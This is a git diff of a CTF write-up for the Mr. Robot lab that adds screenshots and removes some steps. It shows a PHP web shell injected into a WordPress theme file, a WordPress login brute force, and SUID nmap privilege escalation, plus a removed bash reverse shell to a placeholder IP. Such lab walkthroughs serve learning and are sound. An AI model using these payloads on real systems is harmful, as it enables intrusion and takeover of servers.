@@ -1,4 +1,7 @@
-# 🤖 Mr. Robot CTF — Full Write-Up
+#  Mr. Robot CTF — Full Write-Up
+<p align="center">
+  <img src="mrrobot_badge_room_logo.png" alt="Logo" width="200"/>
+</p>
 
 > **Platform:** TryHackMe / CTF Lab  
 > **Difficulty:** Beginner / Intermediate  
@@ -36,6 +39,8 @@ This write-up covers my full thought process solving the **Mr. Robot** themed CT
 
 ## 1. Recon & Port Scanning
 
+
+
 Started with a full port scan:
 
 ```bash
@@ -48,6 +53,7 @@ nmap -p- -sC -sV 10.113.136.116
 | `-sC` | Run default NSE scripts |
 | `-sV` | Detect service versions |
 
+![nmap](nmap_frst_command.png)
 **Output:**
 ```
 Not shown: 65532 filtered tcp ports (no-response)
@@ -135,30 +141,17 @@ WordPress confirmed. The modified readme/license files were intentional red herr
 
 ---
 
-## 6. Username Enumeration
 
-Used WordPress's author redirect feature:
-
-```
-http://10.113.136.116/?author=1
-```
-
-Redirected to `/author/Elliot/` — valid username confirmed: **`Elliot`**
-
----
-
-## 7. Password Brute Force
+## 6. Username & Password Brute Force
 
 Used `ffuf` to brute force the WordPress login:
 
-```bash
-ffuf -w fclean.txt \
-  -u http://10.113.136.116/wp-login.php \
-  -X POST \
-  -d "log=Elliot&pwd=FUZZ&wp-submit=Log+In" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -fr "The password you entered"
-```
+![username](Fuff_username.png)
+*Found "eloit" as a username*
+
+![passwd](fuff_passwd.png)
+
+*Here it is !*
 
 | Flag | Purpose |
 |------|---------|
@@ -171,17 +164,20 @@ ffuf -w fclean.txt \
 
 ---
 
-## 8. Remote Code Execution via Theme Editor
+## 7. Remote Code Execution via Theme Editor
 
 After exploring the dashboard (posts, pages, users, plugins — nothing interesting), I found the real attack surface:
 
 **Appearance → Editor → 404.php**
+
+
 
 The theme editor was enabled. I modified `404.php` to inject a command execution backdoor:
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
+![php injection](404_page_injection.png)
 
 **How it works:** `$_GET['cmd']` reads a URL parameter and passes it to `system()`, which executes it server-side.
 
@@ -197,25 +193,9 @@ http://10.113.136.116/nonexistent?cmd=id
 
 ---
 
-## 9. Reverse Shell
 
-Set up a listener on my machine:
 
-```bash
-nc -lvnp 4444
-```
-
-Triggered a bash reverse shell via the RCE:
-
-```bash
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-```
-
-✅ Shell obtained as **`daemon`**.
-
----
-
-## 10. Key 2 — MD5 Crack & SSH
+## 8. Key 2 — MD5 Crack & SSH
 
 Enumerated the home directory:
 
@@ -239,7 +219,7 @@ Cracked the MD5 hash (recognized as a known hash):
 ```
 abcdefghijklmnopqrstuvwxyz
 ```
-
+![MD5 hash](hash_md5.png)
 SSHed in as `robot`:
 
 ```bash
@@ -248,12 +228,12 @@ ssh robot@10.113.136.116
 
 cat /home/robot/key-2-of-3.txt
 ```
-
+![SSHD](ssh_robot_key2.png)
 ✅ **Key 2 obtained.**
 
 ---
 
-## 11. Privilege Escalation — SUID Nmap
+## 9. Privilege Escalation — SUID Nmap
 
 Searched for SUID binaries:
 
@@ -281,16 +261,17 @@ Inside the interactive shell:
 
 Because the binary is owned by root with the SUID bit set, this spawns a root shell.
 
+![prvesc](root_preveesc.png)
 ✅ **Root obtained.**
 
 ---
 
-## 12. Key 3 — Root
+## 10. Key 3 — Root
 
 ```bash
 cat /root/key-3-of-3.txt
 ```
-
+![key3](key3_root.png)
 ✅ **Key 3 obtained.**
 
 ---
@@ -307,3 +288,6 @@ cat /root/key-3-of-3.txt
 ---
 
 *Machine themed after [Mr. Robot](https://www.imdb.com/title/tt4158110/) — a show about an fsociety hacktivist. Highly recommended if you haven't seen it.*
+<p align="center">
+  <img src="eliot_image.jpg" alt="Logo" width="200"/>
+</p>
